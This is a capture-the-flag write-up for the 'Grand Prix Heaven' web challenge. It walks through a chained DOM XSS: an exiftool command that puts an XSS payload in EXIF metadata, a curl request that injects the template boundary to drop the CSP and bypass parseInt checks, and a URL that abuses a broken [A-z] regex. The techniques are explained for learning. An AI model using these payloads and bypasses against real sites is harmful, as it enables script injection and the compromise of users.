# Grand Prix Heaven Solution 

## TL;DR

1. Create jpb image with payload in EXIF metadata 

2. Create a new car with payload that bypasses csp injection + parseInt() and isNum(), use static boundary to inject additional chunks

3. flag

Challenge is 2 servers: heaven and template. Heaven is the main part of the challenge that players interact with. Template is a "template engine" of sorts, which generates HTML content out of bits of template pieces. 

The goal is to make the template server forget to render the CSP meta-tag, and include the `mediaparser` HTML chunk, which is normally not included anywhere. This media parser is used to extract EXIF metadata from uploaded .jpg files. It retrieves that content and sets it in the page using `innerHTML`, allowing DOM XSS. 

Therefore creating an image with payload in EXIF gives you XSS:
```
exiftool -Exif:ImageDescription="<img src=x onerror=alert(1)>" test.jpg 
```

In order to actually have the mediaparser retrieve your image, it needs to be rendered into the HTML. The parser is "deprecated" and therefore you woulnd't normally be able to include it. But this check: 

```js
    try {
      needleBody = JSON.parse(grandPrix.custom);
      for (const [k, v] of Object.entries(needleBody)) {
        if (!TEMPLATE_PIECES.includes(v.toLowerCase()) || !isNum(parseInt(k)) || typeof(v) == 'object')
          throw new Error("invalid template piece");
        // don't be sneaky. We need a CSP!
        if (parseInt(k) == 0 && v != "csp") throw new Error("No CSP");
      }
    } catch (e) {
      console.log(`ERROR IN /fave/:GrandPrixHeaven:\n${e}`);
      return res.status(400).json({ error: "invalid custom body" });
    }
```

Has several flaws.

1. `parseInt(k)` will parse something like `0honk` as `0`. It ignores any characters if it can parse a valid number out of the first chars it sees. 

2. The later if check can be bypassed either by point 1 above or just not including a `k==0` in the first place. 

The template server is primitive in that it seperates metadata chunks based on the boundary (which is static and known), and therefore you can inject more HTML values in your payload to the template server by just injecting `--GP_HEAVEN` (the boundary) between them. 

```js
const parseMultipartData  = (data, boundary) => {
  var chunks = data.split(boundary);
  // always start with the <head> element
  var processedTemplate = templates.head_start;
  // to prevent loading an html page of arbitrarily large size, limit to just 7 at a time
  let end = 7;
  if (chunks.length-1 <= end) {
    end = chunks.length-1;
  }
  for (var i = 1; i < end; i++) {
    // seperate body from the header parts
    var lines = chunks[i].split('\r\n\r\n')
    .map((item) => item.replaceAll("\r\n", ""))
    .filter((item) => { return item != ''})
    for (const item of Object.keys(templates)) {
        if (lines.includes(item)) {
            processedTemplate += templates[item];
        }
    }
  }
  return processedTemplate;
}
```
This functionality will trigger when you have a `custom` property to your car configuration, which is what is used to to send a POST request to the template server in the first place. Take note of both the IDs that come up, `img_id` and `config_id`.

```
PAYLOAD=$'{"0\\"--GP_HEAVENretrieve--GP_HEAVENmediaparser--GP_HEAVENhead_end--GP_HEAVENfaves--GP_HEAVENfooter\\r\\n\\r\\nthing": "csp"}' && \
curl -X POST -F "year=1337" -F "make=foo" -F "model=bar" -F "custom=$PAYLOAD" -F "image=@test.jpg"  https://grandprixheaven-web.2024.ctfcompetition.com/api/new-car
```

All that's left is to bypass the regex check in `retrieve.js`.

The mediaparser uses the `Requester` class defined in `retrieve.js` in order to retrieve media. However, the `Requester` class always prepends `https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/` to it (`this.url = new URL(url, 'https://grandprixheaven-web.2024.ctfcompetition.com/api/get-car/');`), so giving it your `img_id` will cause it to fail. The regex check, however, is actually broken: 

```js
let re = new RegExp(/^[A-z0-9\s_-]+$/i);
if (re.test(path)) {
    // normalize
    let cleaned = path.replaceAll(/\s/g, "");
    return cleaned;
} else {
    throw new Error("regex fail");
}
```
`/^[A-z0-9\s_-]+$/i` - the issue is the fact that the regex uses `A-z` and not `A-Za-z`. This actually allows for characters in between the unicode character `Z` and the unicode character `a` ([more info](https://wtfjs.com/wtfs/2014-01-29-regular-expression-and-slash)): `[`, `\`, `]`, `^`, `_`, and "`". 

Further along, the URL constructor which creates the URL for mediaparser will normalize the URL - so things like backslashes become forwardslashes, for example. Use this to bypass the regex check and make the `Requester` class reach a `/media/` endpoint.

Visit `https://grandprixheaven-web.2024.ctfcompetition.com/fave/$config_id?F1=\\media\\$img_id`. This should pop your XSS if you included the mediaparser and bypassed the `[A-z]` regex check. 